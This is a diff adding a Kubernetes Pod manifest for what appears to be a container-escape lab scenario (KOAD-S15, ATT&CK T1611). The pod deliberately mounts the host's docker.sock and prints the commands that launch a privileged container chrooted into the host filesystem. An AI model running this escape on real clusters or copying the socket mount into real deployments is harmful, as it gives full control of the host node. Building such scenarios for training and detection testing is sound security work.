@@ -1,0 +1,36 @@
+# KOAD-S15: Docker.sock Escape (DIND)
+# ATT&CK: T1611 — Escape to Host
+# Attack: Mount docker.sock → create privileged container on host
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-docker-sock
+  namespace: koad
+  labels:
+    koad-scenario: S15
+    mitre-attck: T1611
+    escape-method: docker-sock
+spec:
+  containers:
+    - name: attacker
+      image: docker:24-cli
+      command: ["sh", "-c"]
+      args:
+        - |
+          echo "=== KOAD-S15: Docker.sock Escape ==="
+          echo ""
+          echo "Attack steps:"
+          echo "  1. docker -H unix:///var/run/docker.sock ps"
+          echo "  2. docker -H unix:///var/run/docker.sock run -it --privileged --pid=host -v /:/host ubuntu chroot /host"
+          echo ""
+          echo "Result: Full host access via new container"
+          sleep infinity
+      volumeMounts:
+        - name: docker-sock
+          mountPath: /var/run/docker.sock
+  volumes:
+    - name: docker-sock
+      hostPath:
+        path: /var/run/docker.sock
+        type: Socket
